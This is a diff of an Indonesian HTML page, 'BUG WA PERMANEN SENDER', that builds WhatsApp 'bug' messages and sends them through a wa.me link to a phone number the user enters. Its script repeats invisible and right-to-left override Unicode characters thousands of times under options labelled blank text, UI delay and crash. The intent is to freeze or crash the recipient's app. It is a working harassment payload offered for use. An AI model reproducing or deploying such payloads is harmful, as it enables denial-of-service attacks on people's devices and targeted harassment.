@@ -1,62 +1,62 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <title>Bug WhatsApp Sender</title>
+  <meta charset="UTF-8">
+  <title>BUG WA PERMANEN SENDER</title>
   <style>
     body {
+      background-color: #111;
+      color: #fff;
       font-family: sans-serif;
       text-align: center;
-      padding: 30px;
-      background: #1a1a1a;
-      color: white;
+      padding: 40px;
     }
     input, select, button {
-      padding: 10px;
-      font-size: 16px;
-      width: 300px;
       margin: 10px;
-      border-radius: 8px;
+      padding: 10px;
+      font-size: 18px;
+      width: 300px;
+      border-radius: 10px;
       border: none;
     }
     button {
       background-color: #25D366;
       color: white;
+      font-weight: bold;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <h2>🛠️ Bug WhatsApp Sender</h2>
-  <input id="nomor" placeholder="Masukkan nomor (cth: 6281234567890)" /><br>
-
+  <h1>💣 BUG WA SENDER</h1>
+  <input id="nomor" placeholder="Masukkan nomor WA, contoh: 62812xxxxx" /><br>
   <select id="jenis">
     <option value="blank">🕳️ Blank Text</option>
     <option value="ui">🐢 UI Delay</option>
     <option value="crash">💥 Crash Ringan</option>
   </select><br>
-
   <button onclick="kirim()">KIRIM SEKARANG</button>
 
   <script>
-    function getBug(type) {
-      let bug1 = "\u2063".repeat(5000);
-      let bug2 = "\u200F\u202E\u2063\u3164".repeat(3000);
-      let bug3 = "\u202E\u202E\u202E\u202E\u202E".repeat(1000) + "🔒".repeat(500);
-      if (type === "blank") return bug1;
-      if (type === "ui") return bug2;
-      if (type === "crash") return bug3;
+    function getBug(jenis) {
+      if (jenis === "blank") return "\u2063".repeat(6000);
+      if (jenis === "ui") return "\u200F\u202E\u2063\u3164".repeat(5000);
+      if (jenis === "crash") return "\u202E".repeat(1000) + "🔒".repeat(500);
     }
 
     function kirim() {
-      let nomor = document.getElementById("nomor").value;
-      let jenis = document.getElementById("jenis").value;
-      let bug = encodeURIComponent(getBug(jenis));
+      const nomor = document.getElementById("nomor").value.trim();
+      const jenis = document.getElementById("jenis").value;
+      const bug = encodeURIComponent(getBug(jenis));
+
       if (!nomor.startsWith("62")) {
-        alert("Gunakan format nomor dimulai dengan 62");
+        alert("Nomor harus diawali dengan 62");
         return;
       }
-      window.open(`https://wa.me/${nomor}?text=${bug}`, "_blank");
+
+      // Kirim via WhatsApp Web
+      const link = `https://wa.me/${nomor}?text=${bug}`;
+      window.open(link, "_blank");
     }
   </script>
 </body>
